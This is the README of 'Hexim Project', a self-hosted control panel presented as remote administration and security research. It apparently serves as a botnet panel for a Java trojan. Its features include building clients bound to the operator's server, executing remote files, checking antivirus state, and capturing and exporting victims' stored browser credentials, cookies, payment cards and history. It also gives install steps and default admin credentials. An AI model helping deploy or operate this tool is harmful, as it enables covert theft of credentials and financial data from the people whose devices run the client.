<div align="center">

![Hexim Project](frontend/public/hexim-logo.svg)

# HEXIM PROJECT

**Next-generation remote administration & security research suite**

<p>
  <a href="https://discord.gg/hD99cGZWY5">
    <img src="https://img.shields.io/badge/Discord-Join-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord" />
  </a>
  <a href="https://opensource.org/licenses/MIT">
    <img src="https://img.shields.io/badge/License-MIT-7c5cff?style=for-the-badge" alt="License" />
  </a>
  <img src="https://img.shields.io/badge/Version-2.0.4-22d3ee?style=for-the-badge" alt="Version" />
</p>

</div>

---

## Overview

Hexim Project is a self-hosted control panel for remote device administration and security
research. The panel ships with a live device view, remote file manager, system information
collector, session capture, client builder and a hardened dark interface that runs on
Debian 12 / Ubuntu with Docker in one command.

| Layer | Stack |
| --- | --- |
| Frontend | React 19 · TypeScript · Vite · Socket.IO client |
| Backend | Node.js · Express · Socket.IO · PostgreSQL 15 |
| Client | Java 17 (built from the panel) |
| Deploy | Docker Compose · Nginx reverse proxy |

---

## Features

- **Client Builder** — compile a `.jar` client bound to your server URL and gate key directly from the dashboard.
- **Device Management** — live online/offline state, bulk selection, remote kill, screen lock and delete.
- **File Manager** — browse drives, download, execute and delete remote files with a progress stream.
- **SysInfo Collector** — CPU, GPU, RAM, disks, motherboard, network interfaces and antivirus state.
- **Session Capture** — stored credentials, cookies, cards and history with per-browser filtering and export.
- **Screenshot Studio** — live capture, filmstrip gallery, zoom, fullscreen and download.
- **Privacy Mode** — one toggle blurs device names, IPs and keys for streaming or demos.
- **Multi-language** — TR, EN, RU, ZH, AR, ES out of the box.

---

## Quick Install (Debian 12 / Ubuntu)

```bash
unzip HEXIMBot.zip -d /var/www/bot
cd /var/www/bot
chmod +x install.sh
sudo ./install.sh
```

The installer provisions Docker, builds the stack and opens ports 80, 3434 and 5000.

```bash
# default credentials after install
username: admin
password: admin123
```

### Manual / development

```bash
# backend
cd backend && npm install && npm run dev

# frontend
cd frontend && npm install && npm run dev
```

Point the frontend at the API with `VITE_API_URL` (empty means same-origin through the proxy).

---

## Interface

The panel is built on a single dark design system (`frontend/src/styles/theme.css`):

- near-black canvas with layered violet/cyan aurora and grid mesh;
- glass surfaces, 1px hairlines, gradient primary actions;
- monospaced telemetry, live socket indicator and a real-time clock in the top bar;
- full responsive behaviour: the sidebar collapses to an off-canvas drawer under 1024px.

Brand values — name, version, developers, social links — live in one file:
`frontend/src/brand/brand.ts`.

---

## Project Layout

```
├── backend/            Express API, socket server, DB layer, Java client templates
├── client/             Java client sources (built by the panel)
├── frontend/           React control panel
│   ├── public/         favicon + Hexim logo assets
│   └── src/
│       ├── brand/      brand + developer constants
│       ├── components/ Brand, Login, Dashboard, Bots, Discord, Builder, Settings
│       ├── i18n/       six locale dictionaries
│       └── styles/     theme tokens, global shell, component skin
├── docker-compose.yml
└── install.sh
```

---

## Developers

| Name | Handle | Role |
| --- | --- | --- |
| **hazerux** | `@hazeruxdev` | Core · Interface |
| **nexim** | `@nexim.xml` | Backend · Client |

Community: [discord.gg/hD99cGZWY5](https://discord.gg/hD99cGZWY5)

---

## License

MIT — see [LICENSE](LICENSE). The software is provided for educational, research and
authorized administrative use; operators are responsible for how they deploy it.
